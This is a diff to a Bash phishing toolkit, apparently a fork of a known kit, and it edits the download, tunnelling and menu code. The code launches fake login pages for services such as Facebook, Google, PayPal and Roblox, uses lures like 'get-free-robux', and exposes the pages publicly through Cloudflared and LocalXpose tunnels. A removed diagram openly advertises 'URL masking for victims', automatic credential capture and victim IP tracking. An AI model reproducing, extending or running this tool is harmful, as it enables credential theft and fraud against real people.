@@ -1,3 +1,6 @@
+
+
+
 __version__="0.1"
 
 ## DEFAULT HOST & PORT
@@ -61,7 +64,7 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php loclx"
+	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
@@ -75,7 +78,7 @@ kill_pid() {
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -147,123 +150,54 @@ dependencies() {
 		done
 	fi
 }
-# Optimized Binary Downloader
+
+# Download Binaries
 download() {
-    local url="$1"
-    local output="$2"
-    local file
-    file=$(basename "$url")
-    
-    # Ensure local directory integrity
-    mkdir -p .server
+	url="$1"
+	output="$2"
+	file=`basename $url`
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
+	fi
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
 
-    if [[ -e "$file" || -e ".server/$output" ]]; then
-        rm -rf "$file" ".server/$output"
-    fi
-    
-    echo -e "${CYAN}Downloading from: ${url}${WHITE}"
-    
-    # Secure, direct execution of curl without pipeline masking
-    curl --silent --insecure --fail --retry-connrefused \
-         --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
-         
-    if [[ $? -ne 0 ]]; then
-        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error: Network request failed for ${output}.${WHITE}"
-        return 1
-    fi
-
-    # Robust extraction matrix using clear pattern matching
-    if [[ -f "$file" ]]; then
-        if [[ "$file" == *.zip ]]; then
-            unzip -qq -o "$file" -d .server/ > /dev/null 2>&1
-            # Handle cases where the zip does not match output name directly
-            if [[ ! -f ".server/$output" && -f ".server/loclx" ]]; then
-                mv -f .server/loclx ".server/$output" > /dev/null 2>&1
-            fi
-        elif [[ "$file" == *.tar.gz ]] || [[ "$file" == *.tgz ]]; then
-            tar -zxf "$file" -C .server/ > /dev/null 2>&1
-        else
-            mv -f "$file" ".server/$output" > /dev/null 2>&1
-        fi
-        
-        # Explicit authorization of binary execution rights
-        if [[ -f ".server/$output" ]]; then
-            chmod +x ".server/$output" > /dev/null 2>&1
-            rm -rf "$file"
-            echo -e "${GREEN}[${WHITE}+${GREEN}] ${output} successfully deployed.${WHITE}"
-            return 0
-        else
-            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error: Target binary verification failed after extraction.${WHITE}"
-            rm -rf "$file"
-            return 1
-        fi
-    else
-        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error: Download target file missing entirely.${WHITE}"
-        return 1
-    fi
+	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		else
+			mv -f $file .server/$output > /dev/null 2>&1
+		fi
+		chmod +x .server/$output > /dev/null 2>&1
+		rm -rf "$file"
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		{ reset_color; exit 1; }
+	fi
 }
 
 ## Install Cloudflared
 install_cloudflared() {
-    if [[ -f ".server/cloudflared" ]]; then
-        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
-    else
-        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-        local arch
-        arch=$(uname -m)
-        
-        if [[ "$arch" == *'arm'* ]]; then
-            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-        elif [[ "$arch" == *'aarch64'* ]]; then
-            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-        elif [[ "$arch" == *'x86_64'* ]]; then
-            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
-        else
-            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
-        fi
-        
-        if [[ $? -ne 0 ]]; then
-            echo -e "${RED}[!] Critical: Cloudflared setup failed.${WHITE}"
-            return 1
-        fi
-    fi
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
 }
-
-## Install LocalXpose
-install_localxpose() {
-    if [[ -f ".server/loclx" ]]; then
-        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-    else
-        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-        local arch
-        arch=$(uname -m)
-        
-        if [[ "$arch" == *'arm'* ]]; then
-            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-        elif [[ "$arch" == *'aarch64'* ]]; then
-            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-        elif [[ "$arch" == *'x86_64'* ]]; then
-            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-        else
-            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-        fi
-        
-        if [[ $? -ne 0 ]]; then
-            echo -e "${RED}[!] Critical: LocalXpose setup failed.${WHITE}"
-            return 1
-        fi
-    fi
-}
-
-## Exit message
-msg_exit() {
-    clear
-    banner 2>/dev/null || echo "--- Terminal Session Closed ---"
-    echo -e "\n${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
-    reset_color 2>/dev/null
-    exit 0
-}
-
 
 ## Install LocalXpose
 install_localxpose() {
@@ -273,13 +207,13 @@ install_localxpose() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx' || echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} LocalXpose installation skipped"
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx' || echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} LocalXpose installation skipped"
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx' || echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} LocalXpose installation skipped"
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
 		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx' || echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} LocalXpose installation skipped"
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
 		fi
 	fi
 }
@@ -291,71 +225,13 @@ msg_exit() {
 	{ reset_color; exit 0; }
 }
 
-## Ecosystem Diagram
-ecosystem_diagram() {
-	{ clear; banner; echo; }
-	cat <<- EOF
-		${CYAN}
-		${CYAN}┌─────────────────────────────────────────────────────────────┐
-		${CYAN}│             ${WHITE}PHISHKIT - ECOSYSTEM WORKFLOW${CYAN}            │
-		${CYAN}└─────────────────────────────────────────────────────────────┘
-
-		${GREEN}┌─────────────────────────────────────────────────────────────┐
-		${GREEN}│ [PHISHING TEMPLATES] - 35+ Pre-Built Login Pages            │
-		${GREEN}│ Facebook │ Instagram │ Google │ Microsoft │ Netflix │ Steam │
-		${GREEN}│ PayPal │ Twitter │ Twitch │ Discord │ Github │ + 24 More     │
-		${GREEN}└─────────────────────────────────────────────────────────────┘
-		${CYAN}                           ${WHITE}│
-		${CYAN}                           ▼
-		${ORANGE}┌─────────────────────────────────────────────────────────────┐
-		${ORANGE}│ [PHISHKIT CORE] - Server Setup & URL Masking               │
-		${ORANGE}│ ◆ PHP Built-in Server (.server/www)                        │
-		${ORANGE}│ ◆ URL Masking (Attractive URLs for Victims)               │
-		${ORANGE}│ ◆ Automatic Credential Capture                             │
-		${ORANGE}└─────────────────────────────────────────────────────────────┘
-		${CYAN}                           ${WHITE}│
-		${CYAN}                           ▼
-		${BLUE}┌─────────────────────────────────────────────────────────────┐
-		${BLUE}│ [TUNNELING OPTIONS] - Multiple Delivery Methods             │
-		${BLUE}└─────────────────────────────────────────────────────────────┘
-		${BLUE}       ${WHITE}│${BLUE}                    ${WHITE}│${BLUE}                    ${WHITE}│
-		${BLUE}       ▼                      ▼                      ▼
-		${BLUE}┌──────────────┐      ┌──────────────┐      ┌──────────────┐
-		${BLUE}│  LOCALHOST   │      │ CLOUDFLARED  │      │ LOCALXPOSE   │
-		${BLUE}│ Local Network│      │  Public URL  │      │  Public URL  │
-		${BLUE}│  http://...  │      │  https://... │      │  https://... │
-		${BLUE}└──────────────┘      └──────────────┘      └──────────────┘
-		${BLUE}       │                      │                      │
-		${CYAN}       └──────────────────────┼──────────────────────┘
-		${CYAN}                              ▼
-		${RED}┌─────────────────────────────────────────────────────────────┐
-		${RED}│ [CREDENTIAL CAPTURE] - Real-time Data Collection            │
-		${RED}│ ◆ Username/Password Logging (auth/usernames.dat)           │
-		${RED}│ ◆ Victim IP Tracking (auth/ip.txt)                         │
-		${RED}└─────────────────────────────────────────────────────────────┘
-		${CYAN}                           ${WHITE}│
-		${CYAN}                           ▼
-		${MAGENTA}┌─────────────────────────────────────────────────────────────┐
-		${MAGENTA}│ [RESULTS & ANALYSIS] - Captured Data                       │
-		${MAGENTA}│ ◆ Stolen Credentials                                       │
-		${MAGENTA}│ ◆ Victim Geolocation & IP Address                         │
-		${MAGENTA}│ ◆ Session Information                                      │
-		${MAGENTA}└─────────────────────────────────────────────────────────────┘${WHITE}
-
-	EOF
-	
-	echo -e "\n${CYAN}Press ${WHITE}ENTER${CYAN} to continue...${WHITE}"
-	read
-	
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
-	{ sleep 1; main_menu; }
-}
-
 ## About
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}atharvhogade12-cmyk${RED}
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -364,10 +240,11 @@ about() {
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  phd security
+		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
+		  Yisus7u7
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}88${RED}]${ORANGE} Ecosystem
-		${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
@@ -378,8 +255,6 @@ about() {
 		0 | 00)
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
-		88)
-			ecosystem_diagram;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; about; };;
@@ -456,45 +331,22 @@ capture_data() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-	rm -f .server/.cld.log > /dev/null 2>&1
+	rm .cld.log > /dev/null 2>&1 &
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-	if [[ -d "/data/data/com.termux/files/home" ]]; then
-		# Termux Environment - Use proot if available, otherwise run directly
-		if [[ `command -v proot` ]]; then
-			sleep 2 && nohup proot -r / -w / -b /system -b /vendor -b /dev -b /proc ./.server/cloudflared tunnel -url "$HOST":"$PORT" --loglevel debug >> .server/.cld.log 2>&1 &
-		else
-			# Fallback: Run directly with proper logging
-			sleep 2 && nohup ./.server/cloudflared tunnel -url "$HOST":"$PORT" --loglevel debug >> .server/.cld.log 2>&1 &
-		fi
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		# Regular Linux/macOS
-		sleep 2 && nohup ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	sleep 10
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null | head -1)
-	
-	if [[ -z "$cldflr_url" ]]; then
-		echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Waiting for Cloudflared tunnel...${WHITE}"
-		sleep 5
-		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null | head -1)
-	fi
-	
-	if [[ -z "$cldflr_url" ]]; then
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Cloudflared tunnel creation failed!${WHITE}"
-		echo -e "${ORANGE}Logs:${WHITE}"
-		tail -5 ".server/.cld.log" 2>/dev/null || echo "No logs available"
-		echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Returning to menu...${WHITE}"
-		sleep 3
-		tunnel_menu
-	else
-		custom_url "$cldflr_url"
-		capture_data
-	fi
+	sleep 8
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
+	capture_data
 }
 
 localxpose_auth() {
@@ -780,7 +632,7 @@ main_menu() {
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
-		${RED}[${WHITE}88${RED}]${ORANGE} Ecosystem     ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
 	
@@ -919,8 +771,6 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
-		88)
-			ecosystem_diagram;;
 		99)
 			about;;
 		0 | 00 )
@@ -932,34 +782,10 @@ main_menu() {
 	esac
 }
 
-## Welcome Screen
-welcome_screen() {
-	{ clear; banner; echo; }
-	cat <<- EOF
-		${GREEN}
-		${GREEN}╔═══════════════════════════════════════════════════════════╗
-		${GREEN}║        ${WHITE}Welcome to Phishkit - Automated Phishing Tool${GREEN}        ║
-		${GREEN}║                 ${CYAN}30+ Professional Templates${GREEN}               ║
-		${GREEN}╚═══════════════════════════════════════════════════════════╝${WHITE}
-
-		${CYAN}[*] Loading ecosystem information...${WHITE}
-	EOF
-	
-	sleep 2
-	ecosystem_diagram
-}
-
 ## Main
 kill_pid
 dependencies
 check_status
 install_cloudflared
 install_localxpose
-
-# Show welcome screen on first run
-if [[ ! -f ".server/.init" ]]; then
-	touch ".server/.init"
-	welcome_screen
-else
-	main_menu
-fi
+main_menu
